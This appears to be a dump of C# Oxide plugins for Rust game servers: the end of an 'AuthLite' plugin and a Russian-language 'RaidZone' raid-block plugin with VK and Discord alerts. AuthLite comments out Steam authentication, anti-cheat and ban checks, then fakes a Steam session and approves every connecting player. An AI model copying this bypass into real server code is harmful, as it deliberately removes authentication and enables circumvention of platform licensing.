				PlatformService.Instance.EndPlayerSession(connection.userid);
				yield break;
			}*/
			//string text = ConVar.Server.censorplayerlist ? RandomUsernames.Get(connection.userid + (ulong)((long)Random.Range(0, 100000))) : connection.username;
			PlatformService.Instance.UpdatePlayerSession(connection.userid, connection.username);
			yield break;
		}
		public IEnumerator AuthRoutine(Connection connection,ConnectionAuth auth)
		{
			//yield return auth.StartCoroutine(global::Auth_Steam.Run(connection));
			/*if (connection.authStatus != "ok") {
				Debug.Log();
			}*/
			/*Rust.Defines.appID = 252490U;
			yield return auth.StartCoroutine(global::Auth_Steam.Run(connection));
		if (connection.authStatus!="ok")
		{*/
			//no steam player
			Debug.Log("[AuthLite] NoSteam Player");
			yield return auth.StartCoroutine(FakeSteam(connection));
		//}
			
			//yield return auth.StartCoroutine(EAC(connection));
			//yield return auth.StartCoroutine(global::Auth_EAC.Run(connection));
			//yield return auth.StartCoroutine(global::Auth_CentralizedBans.Run(connection));
			/*if (connection.rejected || !connection.active)
			{
				yield break;
			}*/
			/*if (auth.IsAuthed(connection.userid))
			{
				global::ConnectionAuth.Reject(connection, "Ya estas conectado!", null);
				yield break;
			}*/
			yield return null;
			global::ConnectionAuth.m_AuthConnection.Remove(connection);
			
			//approve
			Debug.Log("[AuthLite] Approving...");
			auth.Approve(connection);
			Webhook(connection.username+" Connected from "+ConVar.Server.hostname);
		/*
		//ConnectionQueue cq = ServerMgr.Instance.connectionQueue;
		
		connection.state = Network.Connection.State.InQueue;
		//cq.queue.Add(connection);
		//cq.nextMessageTime = 0f;
		SingletonComponent<global::ServerMgr>.Instance.nextMessageTime = 0f;
		SingletonComponent<global::ServerMgr>.Instance.JoinGame(connection);*/
			yield break;
		}
    }
}

// --- End of file: AuthLite.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/RaidZone.cs ---
// --- Original Local Path: HudRust/RaidZone.cs ---

﻿using Oxide.Core;
using System.Collections.Generic;
using System.Linq;
using Rust;
using UnityEngine;
using System.Collections;
using System;
using Newtonsoft.Json;
using Oxide.Core.Libraries.Covalence;
using Random = UnityEngine.Random;
using Oxide.Core.Plugins;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;
using ru = Oxide.Game.Rust;

namespace Oxide.Plugins
{
    [Info("RaidZone", "fermens", "0.1.51")]
    [Description("Рейблок по зонам")]
    public class RaidZone : RustPlugin
    {
        #region КОНФИГa
        private static PluginConfig config;

        protected override void LoadDefaultConfig()
        {
            config = PluginConfig.DefaultConfig();
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        private static Dictionary<string, string> _names = new Dictionary<string, string>
        {
            { "wall Stone", "вашу каменную стену"},
            { "wall.low Stone", "вашу каменную низкую стену"},
            { "wall.frame Stone", "ваш каменный настенный каркас"},
            { "foundation Stone", "ваш каменный фундамент"},
            { "roof Stone", "вашу каменную крышу"},
            { "wall.doorway Stone", "ваш каменный дверной проём"},
            { "foundation.steps Stone", "ваши каменные ступеньки"},
            { "block.stair.lshape Stone", "вашу каменную L-лестницу"},
            { "block.stair.ushape Stone", "вашу каменную U-лестницу"},
            { "foundation.triangle Stone", "ваш каменный треугольный фундамент"},
            { "wall.window Stone", "ваш каменное окно"},
            { "wall.half Stone", "вашу каменную полустену"},
            { "wall Metal", "вашу металлическую стену"},
            { "wall.low Metal", "вашу металлическую низкую стену"},
            { "wall.frame Metal", "ваш металлический настенный каркас"},
            { "foundation Metal", "ваш металлический фундамент"},
            { "roof Metal", "вашу металлическую крышу"},
            { "wall.doorway Metal", "ваш металлический дверной проём"},
            { "foundation.steps Metal", "ваши металлические ступеньки"},
            { "block.stair.lshape Metal", "вашу металлическую L-лестницу"},
            { "block.stair.ushape Metal", "вашу металлическую U-лестницу"},
            { "foundation.triangle Metal", "ваш металлический треугольный фундамент"},
            { "wall.window Metal", "ваше металлическое окно"},
            { "wall.half Metal", "вашу металлическую полустену"},
            { "wall TopTier", "вашу бронированную стену"},
            { "wall.low TopTier", "вашу бронированную низкую стену"},
            { "wall.frame TopTier", "ваш бронированный настенный каркас"},
            { "foundation TopTier", "ваш бронированный фундамент"},
            { "roof TopTier", "вашу бронированную крышу"},
            { "wall.doorway TopTier", "ваш бронированный дверной проём"},
            { "foundation.steps TopTier", "ваши бронированные ступеньки"},
            { "block.stair.lshape TopTier", "вашу бронированную L-лестницу"},
            { "block.stair.ushape TopTier", "вашу бронированную U-лестницу"},
            { "foundation.triangle TopTier", "ваш бронированный треугольный фундамент"},
            { "wall.window TopTier", "ваше бронированное окно"},
            { "wall.half TopTier", "вашу бронированную полустену"},
            { "wall Wood", "вашу деревянную стену"},
            { "wall.low Wood", "вашу деревянную низкую стену"},
            { "wall.frame Wood", "ваш деревянный настенный каркас"},
            { "foundation Wood", "ваш деревянный фундамент"},
            { "roof Wood", "вашу деревянную крышу"},
            { "wall.doorway Wood", "ваш деревянный дверной проём"},
            { "foundation.steps Wood", "ваши деревянные ступеньки"},
            { "block.stair.lshape Wood", "вашу деревянную L-лестницу"},
            { "block.stair.ushape Wood", "вашу деревянную U-лестницу"},
            { "foundation.triangle Wood", "ваш деревянный треугольный фундамент"},
            { "wall.window Wood", "ваше деревянное окно"},
            { "door.hinged.metal", "вашу металлическую дверь"},
            { "floor Wood", "ваш деревянный пол"},
            { "floor Metal", "ваш металлический пол"},
            { "door.hinged.wood", "вашу деревянную дверь"},
            { "floor Stone", "ваш каменный пол"},
            { "door.double.hinged.wood", "вашу двойную деревянную дверь"},
            { "door.double.hinged.metal", "вашу двойную металлическую дверь"},
            { "shutter.wood.a", "ваши деревянные ставни"},
            { "wall.frame.garagedoor", "вашу гаражную дверь"},
            { "wall.window.bars.wood", "вашу деревянную решетку"},
            { "floor.triangle Stone", "ваш каменный треугольный потолок"},
            { "wall.external.high.wood", "ваши высокие деревянные ворота"},
            { "door.double.hinged.toptier", "вашу двойную бронированную дверь"},
            { "floor.triangle Metal", "ваш металлический треугольный потолок"},
            { "wall.frame.netting", "вашу сетчатую стену"},
            { "door.hinged.toptier", "вашу бронированную дверь"},
            { "shutter.metal.embrasure.a", "ваши металлические ставни"},
            { "wall.external.high.stone", "вашу высокую каменную стену"},
            { "gates.external.high.stone", "ваши высокие каменные ворота"},
            { "floor.ladder.hatch", "ваш люк с лестнице"},
            { "floor.grill", "ваш решетчатый настил"},
            { "floor.triangle Wood", "ваш деревянный треугольный потолок"},
            { "floor.triangle TopTier", "ваш бронированный треугольный потолок"},
            { "gates.external.high.wood", "ваши высокие деревянные ворота"},
            { "wall.half Wood", "вашу деревянную полустену"},
            { "floor TopTier", "ваш треугольный бронированный потолок"},
            { "wall.frame.cell", "вашу тюремную стену"},
            { "wall.window.bars.metal", "вашу металлическую решетку"},
            { "wall.frame.fence", "ваш сетчатый забор"},
            { "shutter.metal.embrasure.b", "вашу металлическую бойницу"},
            { "wall.window.glass.reinforced", "ваше окно из укрепленного стекла"},
            { "wall.frame.fence.gate", "вашу сетчатую дверь"},
            { "floor.frame Stone", "ваш каменный пол"},
            { "wall.frame.cell.gate", "вашу тюремную решетку"},
            { "floor.frame Metal", "ваш металический пол"},
            { "floor.frame Wood", "ваш деревянный пол" }
        };

        private static string[] _spisok = new string[] { "wall.external.high", "wall.external.high.stone", "gates.external.high.wood", "gates.external.high.stone", "wall.window.bars.metal", "wall.window.bars.toptier", "wall.window.glass.reinforced", "wall.window.bars.wood" };

        class POSITION
        {
            [JsonProperty("Нулевая точка")]
            public string zero;

            [JsonProperty("offsetmax")]
            public string offsetmax;

            [JsonProperty("offsetmin")]
            public string offsetmin;
        }

        class GUI
        {
            [JsonProperty("Текст")]
            public string text;

            [JsonProperty("Цвет фона")]
            public string background;

            [JsonProperty("Цвет нижней полоски")]
            public string footline;

            [JsonProperty("Цвет текста")]
            public string colortext;

            [JsonProperty("Размер текста")]
            public string sizetext;

            [JsonProperty("Время капсом?")]
            public bool timeupper;

            [JsonProperty("Расположение")]
            public POSITION position;
        }

        class MARKER
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("Цвет маркера")]
            public string color1;

            [JsonProperty("Цвет обводки")]
            public string color2;

            [JsonProperty("Прозрачность")]
            public float alfa;

            [JsonProperty("Отображать круг?")]
            public bool circle;

            [JsonProperty("Отображать маркером взрыва?")]
            public bool boom;
        }

        class BLOCK
        {
            [JsonProperty("Телепорт")]
            public bool tp;

            [JsonProperty("Киты")]
            public bool kits;

            [JsonProperty("Трейд")]
            public bool trade;

            [JsonProperty("Строительство")]
            public bool build;

            [JsonProperty("Ремонт/улучшение/ремув - не плагином")]
            public bool ingame;

            [JsonProperty("Команды")]
            public string[] commands;

            [JsonProperty("Сообщение о блоке")]
            public string text;

            [JsonProperty("Можно строить/устанавливать во время блокировки [prefabId]")]
            public uint[] whitelist;
        }

        class VK
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("API от группы")]
            public string api;

            [JsonProperty("Текст")]
            public string text;

            [JsonProperty("Кд на отправку")]
            public float cooldown;

            [JsonProperty("Сообщение при входе игрока на сервер, при условии, что он не присоеденил свой вк")]
            public string message;
        }

        class Discord
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("Текст")]
            public string text;

            [JsonProperty("Кд на отправку")]
            public float cooldown;
        }

        class COMBATBLOCK
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("Блокировать при попадании по игроку?")]
            public bool damageto;

            [JsonProperty("Блокировать при получении урона от игрока?")]
            public bool damagefrom;

            [JsonProperty("Блокировать команды")]
            public string[] blacklist;

            [JsonProperty("Текст")]
            public string text;

            [JsonProperty("Время блокировки")]
            public float blockseconds;

            [JsonProperty("Включить GUI?")]
            public bool enablegui;
        }

        class GAME
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("Текст")]
            public string text;

            [JsonProperty("Кд на отправку")]
            public float cooldown;
        }

        enum MES { rnmain, rndelete, notallow, rnmainadded, rnaddcooldown, rnadd, rnconfirm, rncancel, rnnocode, rnnovk, rnnewvk, rnprivate, rnerror, rnblack, rnerror2 }

        private class PluginConfig
        {
            [JsonProperty("Время блокировки")]
            public int blockseconds;

            [JsonProperty("Название сервера - для оповещений")]
            public string servername;

            [JsonProperty("Радиус")]
            public float radius;

            [JsonProperty("Снимать блокировку если вышел из рейд-зоны?")]
            public bool blockremove;

            [JsonProperty("Сброс рейдблока при смерти?")]
            public bool removedeath;

            [JsonProperty("Рейдблок установливается даже если на территории нет шкафа?")]
            public bool cupboard;

            [JsonProperty("Настройка маркера на карте")]
            public MARKER marker;

            [JsonProperty("Настройка GUI")]
            public GUI gui;

            [JsonProperty("Настройка блокировки")]
            public BLOCK block;

            [JsonProperty("Команда")]
            public string command;

            [JsonProperty("Настройка комбатблока")]
            public COMBATBLOCK combatblock;

            [JsonProperty("Оповещение о рейде в игре")]
            public GAME GAME;

            [JsonProperty("Оповещание о рейде в ВК")]
            public VK vk;

            [JsonProperty("Оповещание о рейде в Дискорд")]
            public Discord discord;

            [JsonProperty("Сообщения")]
            public Dictionary<MES, string> messages;

            [JsonProperty("Названия - для оповещаний")]
            public Dictionary<string, string> names;

            [JsonProperty("Дополнительный список на что кидать РБ")]
            public string[] spisok;

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    blockseconds = 120,
                    radius = 75f,
                    blockremove = true,
                    servername = "HaxLite X10",
                    cupboard = false,
                    removedeath = false,
                    gui = new GUI
                    {
                        background = "0.4842625 0.1774008 0.1774008 0.3960784",
                        colortext = "1 1 1 0.7",
                        sizetext = "18",
                        timeupper = true,
                        footline = "0.9442612 0.5032899 0.5032899 1",
                        text = "БЛОКИРОВКА НА {time}",
                        position = new POSITION
                        {
                            zero = "0.5 0",
                            offsetmin = "-200 85",
                            offsetmax = "180 107"
                        }
                    },
                    marker = new MARKER
                    {
                        alfa = 0.6f,
                        color1 = "#FF0000",
                        color2 = "#000000",
                        enable = true,
                        boom = true,
                        circle = true
                    },
                    block = new BLOCK
                    {
                        build = true,
                        kits = true,
                        trade = true,
                        ingame = true,
                        tp = true,
                        commands = new string[] { "oo", "duel" },
                        whitelist = new uint[] { 2335812770, 2057881102, 1206527181, 2089327217, 2150203378 },
                        text = "<color=yellow>Вы находитесь в зоне рейд-блока!</color>"
                    },
                    vk = new VK
                    {
                        api = "",
                        cooldown = 1200f,
                        enable = true,
                        text = "Внимание! Игрок {name} разрушил {destroy} в квадрате {quad}\nconnect {ip}",
                        message = "Вы не добавили свой Вк для оповещений о рейде\nВы можете это сделать командой <color=yellow>/rn add vk.com/ID</color>"
                    },
                    discord = new Discord
                    {
                        cooldown = 1200f,
                        enable = true,
                        text = "```Внимание! Игрок {name} разрушил {destroy} в квадрате {quad}\nconnect {ip}```"
                    },
                    combatblock = new COMBATBLOCK
                    {
                        enable = true,
                        blockseconds = 30f,
                        damagefrom = true,
                        damageto = true,
                        blacklist = new string[] { "tpr", "home", "tpa", "oo" },
                        text = "<color=yellow>Вы недавно стрелялись с другим игроком!</color>\nВы сможете использовать эту команду через <color=yellow>{time}</color>",
                        enablegui = true
                    },
                    GAME = new GAME
                    {
                        enable = true,
                        cooldown = 300f,
                        text = "<color=yellow>ВНИМАНИЕ! ВАШ ДОМ РЕЙДИТ ИГРОК {name}! КВАДРАТ {quad}</color>"
                    }, messages = new Dictionary<MES, string>
                    {
                        { MES.notallow, "У вас нет доступа к этой команде!" },
                        { MES.rnmain, "Что бы добавить оповещание о рейде в <color=yellow>ВК</color>.\nНапишите в чат: <color=yellow>/rn add vk.com/ID</color>\nПример: <color=yellow>/rn add vk.com/fermenspwnz</color>"},
                        { MES.rnmainadded, "Ваш ВК указан как: <color=#c6ec79>vk.com/{value}</color>\n<color=yellow>/rn delete</color> - отвязать ВК"},
                        { MES.rnaddcooldown, "Отправить новый код вы сможете через {time}"},
                        { MES.rnadd, "Введите в игре /rn accept {num}, для подтверджения аккаунта." },
                        { MES.rnconfirm, "<color=#c6ec79>Отлично! Ваш VK подтвержден!</color>"},
                        { MES.rncancel, "<color=yellow>Не верный код!</color>"},
                        { MES.rnnocode, "<color=yellow>Вы не указали код!</color>"},
                        { MES.rndelete, "<color=#c6ec79>Ваш VK успешно отвязан от игрового аккаунта!</color>"},
                        { MES.rnnovk, "<color=yellow>У вас нет привязаного к игровому аккаунту ВК!</color>"},
                        { MES.rnnewvk, "Вы указали VK: <color=yellow>{id}</color>\nВам в VK отправлено сообщение с кодом.\n<color=yellow>/rn accept <код></color> - подтвердить авторизацию."},
                        { MES.rnprivate, "Ваши настройки приватности не позволяют отправить вам сообщение (<color=#a2d953>{id}</color>)"},
                        { MES.rnerror, "Невозможно отправить сообщение.\nПроверьте правильность ссылки (<color=#a2d953>{id}</color>) или повторите попытку позже."},
                        { MES.rnblack, "Невозможно отправить сообщение.\nВы добавили группу в черный список или не подписаны на нее, если это не так, то просто напишите в группу сервера любое сообщение и попробуйте еще раз."},
                        { MES.rnerror2, "Вы указали неверный VK ID (<color=#a2d953>{id}</color>), если это не так, то просто напишите в группу сервера любое сообщение и попробуйте еще раз."}
                    },
                    names = _names,
                    spisok = _spisok,
                    command = "rn"
                };
            }
        }
        #endregion

        #region БЛОККОМАНД
        private object OnServerCommand(ConsoleSystem.Arg arg) => blocker(arg.Player(), arg.cmd.FullName);
        
        private object OnUserCommand(IPlayer ipplayer, string com, string[] args)
        {
            com = com.TrimStart('/').Substring(com.IndexOf(".", StringComparison.Ordinal) + 1);
            BasePlayer player = BasePlayer.Find(ipplayer.Id);
            return blocker(player, com);
        }

        private object blocker(BasePlayer player, string command)
        {
            if (player == null) return null;

            if (IsBlock.ContainsKey(player.userID))
            {
                if (config.block.commands.Contains(command))
                {
                    player.ChatMessage(config.block.text);
                    return false;
                }
            }

            COMBATBK cOMBATBK;
            if (HasCombatBlock(player) && player.TryGetComponent<COMBATBK>(out cOMBATBK) && cOMBATBK.tick > 0)
            {
                if (config.combatblock.blacklist.Contains(command))
                {
                    player.ChatMessage(config.combatblock.text.Replace("{time}", FormatTime(TimeSpan.FromSeconds(cOMBATBK.tick)).ToLower()));
                    return false;
                }
            }

            return null;
        }
        #endregion

        #region КОМБАТБЛОК
        private static List<ulong> combatblock = new List<ulong>();
        private bool HasCombatBlock(BasePlayer player)
        {
            return combatblock.Contains(player.userID) ? true : false;
        }

        private void OnPlayerAttack(BasePlayer attacker, HitInfo info)
        {
            if (info == null || info.HitEntity == null || IsNPC(attacker)) return;
            if (info.HitEntity is BasePlayer)
            {
                BasePlayer target = info.HitEntity.ToPlayer();
                if (target == null || IsNPC(target)) return;
                int block = (int)config.combatblock.blockseconds;
                if (config.combatblock.damageto)
                {
                    ADDCOMBATBLOCK(attacker, block);
                }
                if (config.combatblock.damagefrom)
                {
                    ADDCOMBATBLOCK(target, block);
                }
            }
        }

        private void ADDCOMBATBLOCK(BasePlayer player, int time, bool raidblock = false)
        {
            if (!raidblock && IsBlock.ContainsKey(player.userID)) return;
            COMBATBK cOMBATBK;
            if (!player.TryGetComponent<COMBATBK>(out cOMBATBK))
            {
                cOMBATBK = player.gameObject.AddComponent<COMBATBK>();
            }

            if(time > cOMBATBK.tick) cOMBATBK.tick = time;
            if (raidblock == true) cOMBATBK.ADDRAID();
        }

        class COMBATBK : MonoBehaviour
        {
            BasePlayer player;
            public int tick;
            public bool raidblock;
            private void Awake()
            {
                player = GetComponent<BasePlayer>();
                if (player == null)
                {
                    Destroy(this);
                    return;
                }
                raidblock = false;
                if (!combatblock.Contains(player.userID)) combatblock.Add(player.userID);
                InvokeRepeating(nameof(TICK), 1f, 1f);
            }

            public void ADDRAID()
            {
                if (ins.IsBlock.ContainsKey(player.userID)) ins.IsBlock.Remove(player.userID);
                ins.IsBlock.Add(player.userID, null);
                raidblock = true;
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "AddUI", GUIJSON.Replace("{text}", config.gui.text.Replace("{time}", FormatTime(TimeSpan.FromSeconds(tick)))));
            }

            private void TICK()
            {
                tick--;
                GameObject gameObject; 
                if (tick <= 0 || !raidblock && ins.IsBlock.TryGetValue(player.userID, out gameObject) && gameObject != null)
                {
                    Destroy(this);
                    return;
                }
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "AddUI", GUIJSON.Replace("{text}", config.gui.text.Replace("{time}", FormatTime(TimeSpan.FromSeconds(tick)))));
            }

            public void DoDestroy() => Destroy(this);

            private void OnDestroy()
            {
                if (IsInvoking(nameof(TICK))) CancelInvoke(nameof(TICK));
                if(combatblock.Contains(player.userID)) combatblock.Remove(player.userID);
                GameObject x;
                if (ins.IsBlock.TryGetValue(player.userID, out x))
                {
                    if (raidblock && x == null)
                    {
                        ins.IsBlock.Remove(player.userID);
                        CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                    }
                }
                else
                {
                    CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                }
            }
        }


        /*
                private void REMOVECOMBATBLOCK(BasePlayer player)
                {
                    COMBATBLOCKER cOMBATBLOCKER;
                    if (!combatblock.TryGetValue(player, out cOMBATBLOCKER)) return;
                    if (!cOMBATBLOCKER.ttime.Destroyed) cOMBATBLOCKER.ttime.Destroy();
                    if (!IsBlock.Contains(player.userID)) CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                }*/
        #endregion

        #region ИГРОК ВЫШЕЛ ИЗ СЕРВЕРА

        Dictionary<BasePlayer, GameObject> disconnected = new Dictionary<BasePlayer, GameObject>();

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            COMBATBK cOMBATBK;
            if (player.TryGetComponent<COMBATBK>(out cOMBATBK)) cOMBATBK.DoDestroy();
            GameObject gameObject;
            if (!IsBlock.TryGetValue(player.userID, out gameObject) || gameObject == null) return;
            ZONE zONE;
            if (!gameObject.TryGetComponent<ZONE>(out zONE)) return;
            disconnected[player] = gameObject;
            zONE.RemovePlayer(player);
        }
        #endregion

        #region GRID
        private static Dictionary<string, Vector3> Grids = new Dictionary<string, Vector3>();
        private void CreateSpawnGrid()
        {
            Grids.Clear();
            var worldSize = (ConVar.Server.worldsize);
            float offset = worldSize / 2;
            var gridWidth = (0.0066666666666667f * worldSize);
            float step = worldSize / gridWidth;

            string start = "";

            char letter = 'A';
            int number = 0;

            for (float zz = offset; zz > -offset; zz -= step)
            {
                for (float xx = -offset; xx < offset; xx += step)
                {
                    Grids.Add($"{start}{letter}{number}", new Vector3(xx - 55f, 0, zz + 20f));
                    if (letter.ToString().ToUpper() == "Z")
                    {
                        start = "A";
                        letter = 'A';
                    }
                    else
                    {
                        letter = (char)(((int)letter) + 1);
                    }


                }
                number++;
                start = "";
                letter = 'A';
            }
        }

        private string GetNameGrid(Vector3 pos)
        {
            return Grids.Where(x => x.Value.x < pos.x && x.Value.x + 150f > pos.x && x.Value.z > pos.z && x.Value.z - 150f < pos.z).FirstOrDefault().Key;
        }
        #endregion

        #region CONSOLECOMMAND
        [ConsoleCommand("vkintegra")]
        private void Cmdvkintegra(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            JObject vks = Interface.Oxide.DataFileSystem.ReadObject<JObject>("VKBotUsers");
            if (vks == null)
            {
                arg.ReplyWith("ДатаФайл VKBotUsers отсутсвует или пуст!");
            }
            int i = 0;
            foreach (var z in vks["VKUsersData"])
            {
                foreach (JObject obj in z)
                {
                    ulong userid = (ulong)obj["UserID"];
                    if (!VkPlayers.ContainsKey(userid))
                    {
                        VkPlayers.Add(userid, "id" + (string)obj["VkID"]);
                        i++;
                    }
                }
            }
            arg.ReplyWith($"Добавили {i} юзеров.");
            SaveVK();
        }
        #endregion
        private static RaidZone ins;
        private void Init()
        {
            ins = this;
            Unsubscribe(nameof(OnPlayerAttack));
            Unsubscribe(nameof(OnPlayerDeath));
            Unsubscribe(nameof(CanAffordUpgrade));
            Unsubscribe(nameof(OnStructureRepair));
            Unsubscribe(nameof(OnStructureDemolish));
        }

        private void OnServerInitialized()
        {
            if (config.spisok == null)
            {
                config.marker.circle = true;
                config.marker.boom = true;
                config.vk.message = "Вы не добавили свой Вк для оповещений о рейде\nВы можете это сделать командой <color=yellow>/rn add vk.com/ID</color>";
                config.spisok = _spisok;
                SaveConfig();
            }

            if (string.IsNullOrEmpty(config.command))
            {
                config.command = "rn";
                SaveConfig();
            }

            Interface.Oxide.GetLibrary<ru.Libraries.Command>(null).AddChatCommand(config.command, this, "callcommandrn");

            #region НАСТРОЙКА КАПСА
            if (config.gui.timeupper)
            {
                m0 = m0.ToUpper();
                m1 = m1.ToUpper();
                m2 = m2.ToUpper();
                s0 = s0.ToUpper();
                s1 = s1.ToUpper();
                s2 = s2.ToUpper();
            }
            else
            {
                m0 = m0.ToLower();
                m1 = m1.ToLower();
                m2 = m2.ToLower();
                s0 = s0.ToLower();
                s1 = s1.ToLower();
                s2 = s2.ToLower();
            }
            #endregion

            #region НАСТРОЙКА GUI
            string raidtext = "{\"name\":\"RAIDTEXT\",\"parent\":\"RAIDFONE\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{text}\",\"fontSize\":{sizetext},\"align\":\"MiddleCenter\",\"color\":\"{colortext}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]}".Replace("{sizetext}", config.gui.sizetext).Replace("{colortext}", config.gui.colortext);
            GUITEXT = "[" + raidtext + "]";
            GUIJSON = "[{\"name\":\"RAIDFONE\",\"parent\":\"Hud\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{background}\"},{\"type\":\"RectTransform\",\"anchormin\":\"{zero}\",\"anchormax\":\"{zero}\",\"offsetmin\":\"{offsetmin}\",\"offsetmax\":\"{offsetmax}\"}]},{\"name\":\"BOTTOMSHIT\",\"parent\":\"RAIDFONE\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"{footline}\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 0.05\",\"offsetmin\":\"0 0\",\"offsetmax\":\"0 0\"}]},{raidtext}]".Replace("{background}", config.gui.background).Replace("{footline}", config.gui.footline).Replace("{zero}", config.gui.position.zero).Replace("{offsetmax}", config.gui.position.offsetmax).Replace("{offsetmin}", config.gui.position.offsetmin).Replace("{raidtext}", raidtext);
            #endregion

            #region НАСТРОЙКА МАРКЕРА
            if (!ColorUtility.TryParseHtmlString(config.marker.color1, out COLOR1))
            {
                Debug.LogError("ЦВЕТ МАРКЕРА НЕ В ФОРМАТЕ HEX!");
            }

            if (!ColorUtility.TryParseHtmlString(config.marker.color2, out COLOR2))
            {
                Debug.LogError("ЦВЕТ ОБВОДКИ МАРКЕРА НЕ В ФОРМАТЕ HEX!");
            }
            #endregion

            #region НАСТРОЙКА БЛОКИРОВКИ
            if (config.block.ingame)
            {
                Subscribe(nameof(CanAffordUpgrade));
                Subscribe(nameof(OnStructureRepair));
                Subscribe(nameof(OnStructureDemolish));
            }
            #endregion

            #region НАСТРОЙКА КОМБАТБЛОКА
            if (config.combatblock.enable) Subscribe(nameof(OnPlayerAttack));
            #endregion

            #region НАСТРОЙКА ОПОВЕЩЕНИЯ О РЕЙДЕ
            VkPlayers = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, string>>("raidzone_vk");
            permission.RegisterPermission(permvk, this);
            if (config.vk.enable && string.IsNullOrEmpty(config.vk.api))
            {
                Debug.LogError("ВЫ ВКЛЮЧИЛИ ОПОВЕЩЕНИЕ ДЛЯ ВК, НО ПРИ ЭТОМ НЕ УКАЗАЛИ API ОТ ГРУППЫ!");
            }
            #endregion

            if (config.removedeath) Subscribe(nameof(OnPlayerDeath));

            if (config.names == null)
            {
                config.names = _names;
                SaveConfig();
            }
            CreateSpawnGrid();
        }

        private void OnPlayerDeath(BasePlayer player, HitInfo info)
        {
            timer.Once(0.1f, () =>
            {
                if (!player.IsConnected) return;
                COMBATBK cOMBATBK;
                if (player.TryGetComponent<COMBATBK>(out cOMBATBK)) cOMBATBK.DoDestroy();
                GameObject gameObject;
                if (!IsBlock.TryGetValue(player.userID, out gameObject) || gameObject == null) return;
                ZONE zONE;
                if (!gameObject.TryGetComponent<ZONE>(out zONE)) return;
                zONE.RemovePlayer(player);
            });
        }

        #region ОПОВЕЩЕНИЕ О РЕЙДЕ
        [PluginReference] private Plugin DiscordCore, HaxBot;
        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info, Item item)
        {
            if (info == null || entity == null) return;
            BasePlayer player = info.InitiatorPlayer;
            if (player == null) return;
            if (entity is BuildingBlock)
            {
                int tt = (int)(entity as BuildingBlock).grade;
                if (tt <= 0) return;
                ServerMgr.Instance.StartCoroutine(GORAID(entity, player, tt));
            }
            else if(entity is AnimatedBuildingBlock || entity is SamSite || entity is AutoTurret || entity is DecayEntity && config.spisok.Contains(entity.ShortPrefabName))
            {
                ServerMgr.Instance.StartCoroutine(GORAID(entity, player));
            }
        }

        private IEnumerator GORAID(BaseCombatEntity entity, BasePlayer player, int tt = 0)
        {
            Vector3 position = entity.transform.position;
            string dname = entity.ShortPrefabName;
            if (tt == 1) dname += " Wood";
            else if (tt == 2) dname += " Stone";
            else if (tt == 3) dname += " Metal";
            else if (tt == 4) dname += " TopTier";
            BuildingPrivlidge priv = entity.GetBuildingPrivilege(entity.WorldSpaceBounds());
            yield return new WaitForEndOfFrame();
            if (priv != null && !priv.authorizedPlayers.Any(x => x.userid == player.userID))
            {
                CreateTrigger(position, config.blockseconds);
                yield return new WaitForEndOfFrame();
                string name = player.displayName;
                string quad = GetNameGrid(position);
                string connect = ConVar.Server.ip + ":" + ConVar.Server.port;

                string destroy;
                if (!config.names.TryGetValue(dname, out destroy))
                {
                    config.names.Add(dname, dname);
                    destroy = dname;
                    SaveConfig();
                }

                foreach (var z in priv.authorizedPlayers)
                {
                    ALERTPLAYER(z.userid, name, quad, connect, destroy);
                    yield return new WaitForEndOfFrame();
                }
            }
            else if (priv == null && config.cupboard)
            {
                CreateTrigger(position, config.blockseconds);
            }
            yield break;
        }

        class ALERT
        {
            public DateTime gamecooldown;
            public DateTime discordcooldown;
            public DateTime vkcooldown;
            public DateTime vkcodecooldown;
        }

        private static Dictionary<ulong, ALERT> alerts = new Dictionary<ulong, ALERT>();
        private static Dictionary<ulong, string> VkPlayers = new Dictionary<ulong, string>();

        private void ALERTPLAYER(ulong ID, string name, string quad, string connect, string destroy)
        {
            ALERT alert;
            if(!alerts.TryGetValue(ID, out alert))
            {
                alerts.Add(ID, new ALERT());
                alert = alerts[ID];
            }

            #region ОПОВЕЩЕНИЕ В ИГРЕ
            if (config.GAME.enable && alert.gamecooldown < DateTime.Now)
            {
                BasePlayer player = BasePlayer.FindByID(ID);
                if (player != null && player.IsConnected)
                {
                    player.ChatMessage(config.GAME.text.Replace("{name}", name).Replace("{quad}", quad).Replace("{destroy}", destroy));
                    alert.gamecooldown = DateTime.Now.AddSeconds(config.GAME.cooldown);
                }
            }
            #endregion
            #region ОПОВЕЩЕНИЕ В ДИСКОРДЕ
